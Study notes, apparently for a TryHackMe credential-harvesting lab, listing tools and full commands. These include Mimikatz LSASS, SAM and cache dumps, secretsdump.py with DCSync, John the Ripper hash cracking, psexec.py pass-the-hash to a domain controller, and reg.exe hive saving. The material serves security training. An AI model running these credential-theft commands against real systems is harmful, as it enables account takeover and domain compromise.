# 🛠️ Credential Harvesting — Tools

> **Purpose:** Consolidated tool reference for the Credential Harvesting module.

---

# 📊 Tool Summary

| Tool | Category | Main Use |
|---|---|---|
| **Mimikatz** | Windows Credential Extraction | LSASS, SAM, DPAPI, LSA cache |
| **secretsdump.py** | Remote Credential Extraction | SAM, cached credentials, DCSync |
| **Impacket** | Windows/AD Security Toolkit | Remote authentication and credential operations |
| **John the Ripper** | Password Cracking | DCC2 / MSCacheV2 cracking |
| **Hashcat** | Password Cracking | Offline password cracking |
| **psexec.py** | Remote Execution | Pass-the-Hash / remote shell in the supplied lab |
| **reg.exe** | Windows Registry | Save SAM/SYSTEM hives |
| **RDP / Remmina** | Remote Access | Connect to lab workstation |

---

# 1️⃣ Mimikatz

## Main Uses

```text
LSASS
SAM + SYSTEM
DPAPI
LSA Cache
```

## Important Commands

```text
privilege::debug
```

```text
sekurlsa::logonpasswords
```

```text
vault::list
```

```text
vault::cred /export
```

```text
lsadump::sam
```

```text
token::elevate
```

```text
lsadump::cache
```

---

# 2️⃣ secretsdump.py

Part of the Impacket suite.

## Local Credential Extraction

```bash
secretsdump.py WRK/Administrator:<PASSWORD>@<TARGET_IP> -output local_dump
```

Can expose:

```text
SAM hashes
DCC2 / cached domain credentials
```

## Domain Credential Extraction

```bash
secretsdump.py TRYHACKME/<USER>:<PASSWORD>@<DC_IP> -just-dc -output dc_dump
```

Used in the supplied lab to obtain domain credential material through DRSUAPI/DCSync.

---

# 3️⃣ John the Ripper

Used in the supplied material to crack DCC2 / MSCacheV2 hashes.

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

# 4️⃣ Hashcat

The credential-store overview identifies Hashcat as a tool for offline cracking.

General workflow:

```text
Recovered Hash
     ↓
Identify Hash Type
     ↓
Select Hashcat Mode
     ↓
Wordlist / Candidates
     ↓
Offline Cracking
```

---

# 5️⃣ psexec.py

Impacket remote execution tool.

The supplied lab uses it with an NTLM hash:

```bash
psexec.py 'TRYHACKME/Administrator@<DC_IP>' -hashes :<NTLM_HASH>
```

The lab demonstrates obtaining a:

```text
nt authority\system
```

shell on the Domain Controller.

---

# 6️⃣ reg.exe

Used to save registry hives.

```cmd
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
```

```cmd
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

---

# 7️⃣ RDP / Remmina

The supplied lab uses RDP to connect to the workstation.

Example lab target:

```text
10.220.10.20
```

Remmina is available on the AttackBox for the graphical RDP connection.

---

# 🔄 Tool Workflow

```text
RDP / Remmina
      ↓
Local Administrator
      ↓
Mimikatz
      ├── LSASS
      ├── SAM + SYSTEM
      ├── DPAPI
      └── LSA Cache
      ↓
secretsdump.py
      ↓
DCC2 / NTLM / Domain Credential Material
      ↓
John / Hashcat
      ↓
Recovered Credentials
      ↓
secretsdump.py -just-dc
      ↓
psexec.py + NTLM Hash
```

---

# 📌 Quick Revision

```text
Mimikatz
→ Windows credential extraction

secretsdump.py
→ Remote credential extraction

John
→ DCC2 cracking

Hashcat
→ Offline hash cracking

psexec.py
→ Remote execution / PtH workflow

reg.exe
→ Save SAM + SYSTEM

Remmina
→ RDP access
```

---

# ⚠️ Authorisation Reminder

These techniques extract authentication secrets and can provide privileged access. Use them only in systems and labs where you have explicit authorisation.
